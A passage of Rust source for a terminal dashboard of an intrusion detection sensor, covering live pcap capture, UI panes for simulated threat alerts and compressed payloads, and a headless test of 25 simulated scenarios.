                .promisc(true)
                .snaplen(65535)
                .buffer_size(10 * 1024 * 1024)
                .immediate_mode(true)
                .open()
            {
                let is_wifi = cap.get_datalink().0 == 105;
                while is_running_clone.load(Ordering::Relaxed) {
                    match cap.next_packet() {
                        Ok(packet) => {
                            let parsed = parse_packet(counter_clone.fetch_add(1, Ordering::SeqCst), SystemTime::now(), packet.data, is_wifi);
                            if tx_clone.send(parsed).is_err() { break; }
                        }
                        Err(pcap::Error::TimeoutExpired) => {}
                        Err(_) => break,
                    }
                }
            }
        });
        link_layer_str = format!("Live Interface: {}", dev_name);
    }

    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let mut app = App::new(tx.clone(), packet_id_counter.clone());
    app.link_layer_info = link_layer_str;

    let mut last_tick = Instant::now();
    let tick_rate = Duration::from_millis(40);

    loop {
        terminal.draw(|f| draw_ui(f, &mut app))?;
        while let Ok(packet) = rx.try_recv() {
            app.add_packet(packet);
        }

        let timeout = tick_rate.checked_sub(last_tick.elapsed()).unwrap_or(Duration::from_secs(0));
        if event::poll(timeout)? {
            match event::read()? {
                Event::Key(key) => {
                    match key.code {
                        KeyCode::Char('q') | KeyCode::Esc => break,
                        KeyCode::Char('p') => app.is_paused = !app.is_paused,
                        KeyCode::Char('c') => app.clear(),
                        KeyCode::Char('s') => run_full_simulation_sweep(app.tx_packet_channel.clone(), app.packet_id_counter.clone()),
                        KeyCode::Tab => {
                            app.active_pane = match app.active_pane {
                                ActivePane::ScenarioList => ActivePane::AlertsTable,
                                ActivePane::AlertsTable => ActivePane::PacketsTable,
                                ActivePane::PacketsTable => ActivePane::IdsmHexView,
                                ActivePane::IdsmHexView => ActivePane::IdsmJsonView,
                                ActivePane::IdsmJsonView => ActivePane::ScenarioList,
                            };
                        }
                        KeyCode::Enter => {
                            if app.active_pane == ActivePane::ScenarioList {
                                if let Some(idx) = app.scenarios_list_state.selected() {
                                    run_simulation_burst(app.tx_packet_channel.clone(), idx, app.packet_id_counter.clone());
                                }
                            }
                        }
                        KeyCode::Up => {
                            let pane = app.active_pane;
                            scroll_pane_up(&mut app, pane);
                        }
                        KeyCode::Down => {
                            let pane = app.active_pane;
                            scroll_pane_down(&mut app, pane);
                        }
                        KeyCode::Left => {
                            let pane = app.active_pane;
                            scroll_pane_left(&mut app, pane);
                        }
                        KeyCode::Right => {
                            let pane = app.active_pane;
                            scroll_pane_right(&mut app, pane);
                        }
                        _ => {}
                    }
                }
                Event::Mouse(mouse_event) => {
                    let col = mouse_event.column;
                    let row = mouse_event.row;
                    let clicked_pane = if rect_contains(app.scenario_rect, col, row) {
                        Some(ActivePane::ScenarioList)
                    } else if rect_contains(app.alerts_rect, col, row) {
                        Some(ActivePane::AlertsTable)
                    } else if rect_contains(app.packets_rect, col, row) {
                        Some(ActivePane::PacketsTable)
                    } else if rect_contains(app.hex_rect, col, row) {
                        Some(ActivePane::IdsmHexView)
                    } else if rect_contains(app.json_rect, col, row) {
                        Some(ActivePane::IdsmJsonView)
                    } else {
                        None
                    };

                    if let Some(pane) = clicked_pane {
                        app.active_pane = pane;
                        match mouse_event.kind {
                            event::MouseEventKind::ScrollUp => {
                                scroll_pane_up(&mut app, pane);
                            }
                            event::MouseEventKind::ScrollDown => {
                                scroll_pane_down(&mut app, pane);
                            }
                            event::MouseEventKind::ScrollLeft => {
                                scroll_pane_left(&mut app, pane);
                            }
                            event::MouseEventKind::ScrollRight => {
                                scroll_pane_right(&mut app, pane);
                            }
                            _ => {}
                        }
                    }
                }
                _ => {}
            }
        }

        if last_tick.elapsed() >= tick_rate {
            app.prune_old_metrics();
            last_tick = Instant::now();
        }
    }

    is_running.store(false, Ordering::Relaxed);
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen, DisableMouseCapture)?;
    terminal.show_cursor()?;
    Ok(())
}

fn draw_ui(f: &mut Frame, app: &mut App) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(3), Constraint::Min(10), Constraint::Length(1)])
        .split(f.area());

    // --- Header Box ---
    let capture_status = if app.is_paused {
        Span::styled(" PAUSED ", Style::default().fg(Color::Black).bg(Color::Yellow).add_modifier(Modifier::BOLD))
    } else {
        Span::styled(" RUNNING ", Style::default().fg(Color::Black).bg(Color::Green).add_modifier(Modifier::BOLD))
    };

    let saved_bytes = app.total_raw_bytes.saturating_sub(app.total_compressed_bytes);
    let ratio = if app.total_raw_bytes > 0 {
        (saved_bytes as f32 / app.total_raw_bytes as f32) * 100.0
    } else { 0.0 };

    let header_text = vec![
        Span::styled(" IDPS Memory-Mapped Sensor ", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),
        Span::raw(" | "),
        capture_status,
        Span::raw(" | Mode: "),
        Span::styled(&app.link_layer_info, Style::default().fg(Color::LightMagenta)),
        Span::raw(" | PPS: "),
        Span::styled(app.get_pps().to_string(), Style::default().fg(Color::Yellow)),
        Span::raw(" | Bandwidth: "),
        Span::styled(format_bps(app.get_bps()), Style::default().fg(Color::LightGreen)),
        Span::raw(" | IDSM Compression Savings: "),
        Span::styled(format!("{:.1}% ({} Saved)", ratio, format_bytes(saved_bytes as u64)), Style::default().fg(Color::LightCyan).add_modifier(Modifier::BOLD)),
    ];

    f.render_widget(Paragraph::new(Line::from(header_text))
        .block(Block::default().borders(Borders::ALL).border_type(ratatui::widgets::BorderType::Rounded))
        .alignment(Alignment::Center), chunks[0]);

    // --- Main Layout ---
    let main_chunks = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(24), Constraint::Percentage(76)])
        .split(chunks[1]);

    // 1. Left Panel: Threat Scenarios List
    let list_style = if app.active_pane == ActivePane::ScenarioList {
        Style::default().fg(Color::Cyan)
    } else { Style::default().fg(Color::DarkGray) };

    let list_items: Vec<ListItem> = THREAT_SCENARIOS.iter().enumerate().map(|(idx, (layer, name, sev))| {
        let prefix = if app.scenarios_list_state.selected() == Some(idx) { "> " } else { "  " };
        let sev_color = match *sev {
            "Critical" => Color::LightRed,
            "High" => Color::Yellow,
            _ => Color::Gray,
        };
        ListItem::new(Line::from(vec![
            Span::raw(prefix),
            Span::styled(format!("[{}] ", layer), Style::default().fg(Color::DarkGray)),
            Span::styled(*name, Style::default().fg(Color::White)),
            Span::raw(" "),
            Span::styled(format!("({})", sev), Style::default().fg(sev_color)),
        ]))
    }).collect();

    let scenario_list = List::new(list_items)
        .block(Block::default().borders(Borders::ALL).title(" 1. Threat Scenarios (Inject) ").border_style(list_style))
        .highlight_style(Style::default().bg(Color::Rgb(30, 30, 60)).add_modifier(Modifier::BOLD));
    f.render_stateful_widget(scenario_list, main_chunks[0], &mut app.scenarios_list_state);

    // 2. Right Pane: Split horizontally between Sensor & IDSM
    let right_columns = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(50), Constraint::Percentage(50)])
        .split(main_chunks[1]);

    // --- Sensor Pane (Left) ---
    let sensor_chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(60), Constraint::Percentage(40)])
        .split(right_columns[0]);

    // Record boundary boxes for mouse event tracking
    app.scenario_rect = main_chunks[0];
    app.alerts_rect = sensor_chunks[0];
    app.packets_rect = sensor_chunks[1];

    let alert_border_style = if app.active_pane == ActivePane::AlertsTable { Style::default().fg(Color::Cyan) } else { Style::default().fg(Color::DarkGray) };
    
    let alerts_rows: Vec<Row> = app.alerts.iter().map(|a| {
        let sev_color = match a.severity.as_str() {
            "Critical" => Color::LightRed,
            "High" => Color::Yellow,
            _ => Color::Gray,
        };
        Row::new(vec![
            Cell::from(a.id.to_string()),
            Cell::from(a.layer.clone()),
            Cell::from(Span::styled(a.threat_type.clone(), Style::default().fg(Color::White))),
            Cell::from(Span::styled(a.severity.clone(), Style::default().fg(sev_color).add_modifier(Modifier::BOLD))),
            Cell::from(a.time_str.clone()),
        ])
    }).collect();

    let alerts_table = Table::new(alerts_rows, [
        Constraint::Length(5), Constraint::Length(10), Constraint::Min(15), Constraint::Length(10), Constraint::Length(14)
    ])
    .header(Row::new(vec!["ID", "Layer", "Threat Pattern Detected", "Severity", "Time"]).style(Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)))
    .block(Block::default().borders(Borders::ALL).title(" 2. Sensor Filtered Alerts ").border_style(alert_border_style))
    .row_highlight_style(Style::default().bg(Color::Rgb(30, 30, 60)).add_modifier(Modifier::BOLD));
    f.render_stateful_widget(alerts_table, sensor_chunks[0], &mut app.alerts_table_state);

    let packets_border_style = if app.active_pane == ActivePane::PacketsTable { Style::default().fg(Color::Cyan) } else { Style::default().fg(Color::DarkGray) };
    let packets_rows: Vec<Row> = app.selected_alert_packets.iter().map(|p| {
        Row::new(vec![
            Cell::from(p.id.to_string()),
            Cell::from(Span::styled(p.protocol.clone(), Style::default().fg(Color::LightGreen))),
            Cell::from(p.src_mac.clone()),
            Cell::from(p.dst_mac.clone()),
            Cell::from(p.info.clone()),
        ])
    }).collect();

    let packets_table = Table::new(packets_rows, [
        Constraint::Length(6), Constraint::Length(12), Constraint::Length(18), Constraint::Length(18), Constraint::Min(20)
    ])
    .header(Row::new(vec!["PktID", "Protocol", "Source MAC/IP", "Dest MAC/IP", "Info Breakdown"]).style(Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)))
    .block(Block::default().borders(Borders::ALL).title(" 3. Filtered Packets in Alert (Copied to IDSM) ").border_style(packets_border_style))
    .row_highlight_style(Style::default().bg(Color::Rgb(30, 30, 60)));
    f.render_stateful_widget(packets_table, sensor_chunks[1], &mut app.packets_table_state);

    // --- IDSM Pane (Right) ---
    let idsm_chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(50), Constraint::Percentage(50)])
        .split(right_columns[1]);

    let alert_sel_idx = app.alerts_table_state.selected();
    let (stats_block, hex_block, json_block) = if let Some(idx) = alert_sel_idx {
        if idx < app.compressed_alerts.len() {
            let comp = &app.compressed_alerts[idx];
            let stats = vec![
                Line::from(vec![Span::raw("Threat Pattern:  "), Span::styled(&comp.threat_type, Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD))]),
                Line::from(vec![Span::raw("Severity / Rule: "), Span::styled(format!("{} / {}", comp.severity, comp.rule_triggered), Style::default().fg(Color::LightRed))]),
                Line::from(vec![Span::raw("Packets Bundled: "), Span::styled(comp.total_packets_involved.to_string(), Style::default().fg(Color::White))]),
                Line::from(vec![
                    Span::raw("Data Compression: "),
                    Span::styled(format!("Raw: {} B -> Compressed: {} B", comp.raw_packets_size, comp.compressed_size), Style::default().fg(Color::LightMagenta)),
                    Span::raw(" ("),
                    Span::styled(format!("{:.1}% Savings", comp.compression_ratio), Style::default().fg(Color::LightGreen).add_modifier(Modifier::BOLD)),
                    Span::raw(")"),
                ]),
            ];
            (stats, format_hex_dump(&comp.compressed_payload), comp.reconstructed_json.clone())
        } else {
            (vec![Line::raw("No alert selected.")], "No alert selected.".to_string(), "No alert selected.".to_string())
        }
    } else {
        (vec![Line::raw("No alert selected.")], "No alert selected.".to_string(), "No alert selected.".to_string())
    };

    let idsm_stats_layout = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(5), Constraint::Min(3)])
        .split(idsm_chunks[0]);

    app.hex_rect = idsm_stats_layout[1];
    app.json_rect = idsm_chunks[1];

    let hex_border_style = if app.active_pane == ActivePane::IdsmHexView { Style::default().fg(Color::Cyan) } else { Style::default().fg(Color::DarkGray) };
    let json_border_style = if app.active_pane == ActivePane::IdsmJsonView { Style::default().fg(Color::Cyan) } else { Style::default().fg(Color::DarkGray) };

    f.render_widget(Paragraph::new(stats_block).block(Block::default().borders(Borders::LEFT | Borders::RIGHT | Borders::TOP).title(" 4. IDSM Compression Info ")), idsm_stats_layout[0]);
    
    f.render_widget(Paragraph::new(hex_block)
        .block(Block::default().borders(Borders::LEFT | Borders::RIGHT | Borders::BOTTOM)
            .title(" Compressed Binary Payload (Hex sent to Remote SOC) ")
            .border_style(hex_border_style))
        .scroll((app.hex_scroll_offset, app.hex_horiz_scroll_offset)), idsm_stats_layout[1]);

    f.render_widget(Paragraph::new(json_block)
        .block(Block::default().borders(Borders::ALL)
            .title(" 5. IDSM Preserved Semantic Data (Reconstructed at SOC) ")
            .border_style(json_border_style))
        .style(Style::default().fg(Color::LightCyan))
        .scroll((app.json_scroll_offset, app.json_horiz_scroll_offset)), idsm_chunks[1]);

    // --- Footer Pane ---
    let footer_text = Line::from(vec![
        Span::styled(" Tab", Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)), Span::raw(": Switch Panel | "),
        Span::styled(" Arrows", Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)), Span::raw(": Navigate/Scroll | "),
        Span::styled(" Enter", Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)), Span::raw(": Inject Selected | "),
        Span::styled(" S", Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)), Span::raw(": Inject All 25 Sweep | "),
        Span::styled(" C", Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)), Span::raw(": Clear All | "),
        Span::styled(" P", Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)), Span::raw(": Pause/Resume | "),
        Span::styled(" Q/Esc", Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)), Span::raw(": Quit")
    ]);
    f.render_widget(Paragraph::new(footer_text).alignment(Alignment::Center).style(Style::default().bg(Color::Rgb(20, 20, 20)).fg(Color::Gray)), chunks[2]);
}

fn format_bps(bps: usize) -> String {
    let bps_f = bps as f64;
    if bps_f >= 1024.0 * 1024.0 { format!("{:.2} MB/s", bps_f / (1024.0 * 1024.0)) }
    else if bps_f >= 1024.0 { format!("{:.2} KB/s", bps_f / 1024.0) }
    else { format!("{} B/s", bps) }
}

fn format_bytes(bytes: u64) -> String {
    let b = bytes as f64;
    if b >= 1024.0 * 1024.0 * 1024.0 { format!("{:.2} GB", b / (1024.0 * 1024.0 * 1024.0)) }
    else if b >= 1024.0 * 1024.0 { format!("{:.2} MB", b / (1024.0 * 1024.0)) }
    else if b >= 1024.0 { format!("{:.2} KB", b / 1024.0) }
    else { format!("{} B", bytes) }
}

fn run_headless_simulation_test() -> Result<(), Box<dyn Error>> {
    println!("=== Running IDPS Sensor & IDSM Headless Simulation Test ===");
    let (tx, rx) = mpsc::channel();
    let packet_id_counter = Arc::new(AtomicUsize::new(1));
    let mut app = App::new(tx.clone(), packet_id_counter.clone());
    app.is_paused = false;

    for idx in 0..25 {
        println!("Testing Threat Scenario {}: {} ({})", idx + 1, THREAT_SCENARIOS[idx].1, THREAT_SCENARIOS[idx].0);
        run_simulation_burst(tx.clone(), idx, packet_id_counter.clone());
        thread::sleep(Duration::from_millis(50));
        while let Ok(packet) = rx.try_recv() {
            app.add_packet(packet);
        }
    }

    println!("\n=== Headless Test Summary ===");
    println!("Total Packets Captured: {}", app.all_packets_captured);
    println!("Total Alerts Detected:  {}", app.alerts.len());

    if app.alerts.len() < 25 {
        println!("FAIL: Expected at least 25 alerts, got {}", app.alerts.len());
        std::process::exit(1);
    }

    for (idx, (alert, compressed)) in app.alerts.iter().zip(app.compressed_alerts.iter()).enumerate() {
        println!(
            "Alert [{:02}] (Rule: {}): {:<40} | Raw packets total: {:>5} B | IDSM Compressed: {:>4} B | Ratio: {:.1}%",
            idx + 1,
            alert.rule_name,
            alert.threat_type,
            compressed.raw_packets_size,
            compressed.compressed_size,
            compressed.compression_ratio
        );
        assert!(!compressed.reconstructed_json.is_empty(), "IDSM reconstructed JSON must not be empty");
    }

    assert!(app.total_compressed_bytes < app.total_raw_bytes, "Overall IDSM bandwidth must be less than raw packet data size");

    let saved = app.total_raw_bytes.saturating_sub(app.total_compressed_bytes);
    let ratio = if app.total_raw_bytes > 0 {
        (saved as f32 / app.total_raw_bytes as f32) * 100.0
    } else { 0.0 };

    println!("\nTotal Raw Data Transmitted:       {} bytes", app.total_raw_bytes);
    println!("Total Compressed Data Transmitted: {} bytes", app.total_compressed_bytes);
    println!("Overall Bandwidth Savings:          {:.2}%", ratio);
    println!("============================================================");
    println!("SUCCESS: All 25 threat patterns successfully tested, captured, and IDSM compressed!");
    Ok(())
}
